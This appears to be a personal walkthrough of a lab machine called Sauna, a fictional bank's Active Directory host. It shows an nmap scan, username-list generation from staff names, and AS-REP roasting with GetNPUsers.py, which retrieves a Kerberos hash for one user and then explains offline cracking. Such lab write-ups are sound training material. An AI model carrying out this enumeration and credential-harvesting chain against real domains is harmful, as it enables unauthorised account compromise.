
```
nmap -sCV -v -p- -T4 10.129.95.180 -oA nmap/sauna 
...
Discovered open port 139/tcp on 10.129.95.180
Discovered open port 135/tcp on 10.129.95.180
Discovered open port 445/tcp on 10.129.95.180
Discovered open port 53/tcp on 10.129.95.180
Discovered open port 80/tcp on 10.129.95.180
Discovered open port 49676/tcp on 10.129.95.180
Discovered open port 3269/tcp on 10.129.95.180
Discovered open port 636/tcp on 10.129.95.180
Discovered open port 389/tcp on 10.129.95.180
Discovered open port 593/tcp on 10.129.95.180
Discovered open port 5985/tcp on 10.129.95.180
Discovered open port 464/tcp on 10.129.95.180
Discovered open port 49674/tcp on 10.129.95.180
Discovered open port 49673/tcp on 10.129.95.180
Discovered open port 49668/tcp on 10.129.95.180
Discovered open port 49685/tcp on 10.129.95.180
Discovered open port 9389/tcp on 10.129.95.180
Discovered open port 49692/tcp on 10.129.95.180
Discovered open port 88/tcp on 10.129.95.180
Discovered open port 3268/tcp on 10.129.95.180
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-07 08:28:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-07T08:29:40
|_  start_date: N/A
|_clock-skew: 7h00m00s
...

```

![[about-us.png]]

Fergus Smith

Shaun Coins

Hugo Bear

Steven Kerb

Bowie Taylor

Sophie Driver

"User Research" phase

standardized naming conventions are the backbone of AD, but they are also a huge security hole.

Quickly generate a "mangled" list of potential usernames based on these common corporate patterns:

- `fsmith` (First Initial + Last Name)

- `fergus.smith` (First Name + Dot + Last Name)

- `f.smith` (First Initial + Dot + Last Name)

- `smithf` (Last Name + First Initial)

- `ferguss` (First Name + Last Initial)

---

```
git clone https://github.com/urbanadventurer/username-anarchy.git
Cloning into 'username-anarchy'...
...
┌──(lanc3㉿kali)-[/opt/tools]
└─$ cd username-anarchy 

┌──(lanc3㉿kali)-[/opt/tools/username-anarchy]
└─$ ls -la                                        
total 80
drwxrwxr-x 5 lanc3 lanc3  4096 Apr  7 16:07 .
drwxr-xr-x 4 lanc3 lanc3  4096 Apr  7 16:07 ..
-rw-rw-r-- 1 lanc3 lanc3   291 Apr  7 16:07 CHANGELOG.md
drwxrwxr-x 4 lanc3 lanc3  4096 Apr  7 16:07 debian
-rw-rw-r-- 1 lanc3 lanc3  3114 Apr  7 16:07 format-plugins.rb
drwxrwxr-x 7 lanc3 lanc3  4096 Apr  7 16:07 .git
-rw-rw-r-- 1 lanc3 lanc3  1070 Apr  7 16:07 LICENSE
drwxrwxr-x 6 lanc3 lanc3  4096 Apr  7 16:07 names
-rw-rw-r-- 1 lanc3 lanc3  9769 Apr  7 16:07 README.md
-rw-rw-r-- 1 lanc3 lanc3   100 Apr  7 16:07 test-names2.txt
-rw-rw-r-- 1 lanc3 lanc3    80 Apr  7 16:07 test-names3.txt
-rw-rw-r-- 1 lanc3 lanc3    58 Apr  7 16:07 test-names.txt
-rwxrwxr-x 1 lanc3 lanc3 20778 Apr  7 16:07 username-anarchy

┌──(lanc3㉿kali)-[/opt/tools/username-anarchy]
└─$ ./username-anarchy --input-file ~/sauna-names.txt > ~/sauna_wordlist.txt

┌──(lanc3㉿kali)-[/opt/tools/username-anarchy]
└─$ cat ~/sauna_wordlist.txt
fergus
fergussmith
fergus.smith
fergussm
fergsmit
ferguss
f.smith
fsmith
sfergus
s.fergus
smithf
smith
smith.f
smith.fergus
fs
shaun
shauncoins
shaun.coins
shauncoi
shaucoin
shaunc
s.coins
scoins
cshaun
c.shaun
coinss
coins
coins.s
coins.shaun
sc
hugo
hugobear
hugo.bear
hugob
h.bear
hbear
bhugo
b.hugo
bearh
bear
bear.h
bear.hugo
hb
steven
stevenkerb
steven.kerb
stevenke
stevkerb
stevenk
s.kerb
skerb
ksteven
k.steven
kerbs
kerb
kerb.s
kerb.steven
sk
bowie
bowietaylor
bowie.taylor
bowietay
bowitayl
bowiet
b.taylor
btaylor
tbowie
t.bowie
taylorb
taylor
taylor.b
taylor.bowie
bt
sophie
sophiedriver
sophie.driver
sophiedr
sophdriv
sophied
s.driver
sdriver
dsophie
d.sophie
drivers
driver
driver.s
driver.sophie
sd

```
-----


```

GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile sauna_wordlist.txt -format hashcat -dc-ip 10.129.95.180
...
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:7cb1342bb539691b2e44f42e73046695$90fdfb71d66b199353a999962db83d054c15d9679487fb9d0b0c3ff33593b2e75d94e62e7a3bf7247d4008ff6893ca1b00a0769657b499bd7bdbbbd03e298eeb62f91f0997b7f8b4187eb8a8195abbddf61d680fdcd8fd5697c0f300116213b7bf5d22f72f357006d665dd277bae1cb87ca44708d41466da9ece431712476e47bb1f5ca9134ab2164ded4b1ec3facd35697fbe35dcbf769fd783f76e5605f4f7ef2756575570ef9067f1095d6405abc221fef8f3718b80dc49ea831b4e31367727dce3a43c68eb474b8589857bf5a5953018c260881d5d602176b2eb0fc40022217de11c61066895a8c1fc1c746ec70c39195aa2adefbfa6c0f72c5b6f4e4f75
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
...

```
long string starting with `$krb5asrep$` is the **Kerberos AS-REP hash** for the user **fsmith**.

Even though there's a lot of `KDC_ERR_C_PRINCIPAL_UNKNOWN` errors (which just means those specific username guesses didn't exist), we found a "live" one. This proves the naming convention for this bank is **First Initial + Last Name**.

In Active Directory, most users need to provide a password before the Domain Controller (DC) gives them anything. However, **fsmith** has a specific setting enabled: `Do not require Kerberos preauthentication`.

Because of this, the DC just handed you an encrypted piece of their "ticket" (the AS-REP). Now, you can take this home and crack it **offline** without the DC ever knowing.